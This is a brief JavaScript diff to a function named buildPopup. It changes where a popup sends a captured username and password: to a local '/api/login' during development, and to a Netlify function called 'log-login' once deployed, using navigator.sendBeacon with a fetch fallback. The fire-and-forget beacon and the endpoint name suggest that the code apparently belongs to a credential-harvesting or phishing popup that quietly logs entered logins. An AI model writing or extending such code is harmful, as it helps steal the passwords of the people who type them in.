@@ -212,11 +212,13 @@ function buildPopup() {
 
     const payload = JSON.stringify({ username, password });
     const hasBeacon = typeof navigator !== 'undefined' && navigator.sendBeacon;
+    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+    const logEndpoint = isLocal ? '/api/login' : '/.netlify/functions/log-login';
 
     if (hasBeacon) {
-      navigator.sendBeacon('/api/login', new Blob([payload], { type: 'application/json' }));
+      navigator.sendBeacon(logEndpoint, new Blob([payload], { type: 'application/json' }));
     } else {
-      fetch('/api/login', {
+      fetch(logEndpoint, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: payload,
